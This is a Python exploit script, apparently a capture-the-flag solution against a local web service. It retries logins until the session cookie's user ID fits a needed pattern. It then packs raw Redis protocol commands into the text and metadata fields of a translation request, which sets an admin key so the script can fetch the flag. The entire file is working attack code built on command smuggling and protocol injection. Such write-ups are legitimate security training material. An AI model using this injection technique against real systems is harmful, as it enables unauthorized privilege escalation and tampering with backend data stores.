import requests
import re

SERVICE_URL = "http://localhost:3000/"

def toInt(text):
    return int.from_bytes(text.encode('ascii'), "little")


r = requests.session()

userId = 'A' * 100

attempt = 0
# We need a user id with 2 in the 7th position
while userId[6] != '2':
    attempt += 1
    print(f'Attempt {attempt} (1/16 chance).')
    loginResponse = r.post(SERVICE_URL, { 'username': 'David' })

    # Remove the s%3A prefix (indicating a signed cookie) and the signature
    # at the end.
    userId = r.cookies['userId'][4:29]

print(f'Found valid id: {userId}.')

# Add a first command as padding to make sure the second one aligns nicely.
prefix = '\r\n$3\r\nGET\r\n$3\r\npad\r\n'

# We need to wait for the 5s timeout in the BE to complete.
# Actually we don't really have to, but it's easier to just wait.
print('Sending payload. Completion takes a couple of seconds.') 
r.post(SERVICE_URL + 'translate', json={
    'language': 'redis',
    'translationRequest': { 
        'text': prefix + '*3\r\n$3\r\nSET\r\n$31\r\nadmin.' + userId[:6],
        'metadata': [{
            'changeTimestamps': [
                toInt(userId[9:13]),
                toInt(userId[14:18]),
                toInt(userId[19:23]),
                toInt(userId[24] + "\r\n$")
            ],
            'bounty': toInt("\r\ny\r\n"),
            # Pad the metadata so the metadata length is the ascii value of 
            # the desired character.
            # Redis will fail to interpret these chars as a third command,
            # but the previous command will be executed regardless.
            'flags': [1] * (ord(userId[7]) - 0x1f)
        }]
    }
})

response = r.get(SERVICE_URL + 'flag')
flag = re.search('(CSC{.*})', response.content.decode('utf-8')).group(1)
print(flag)
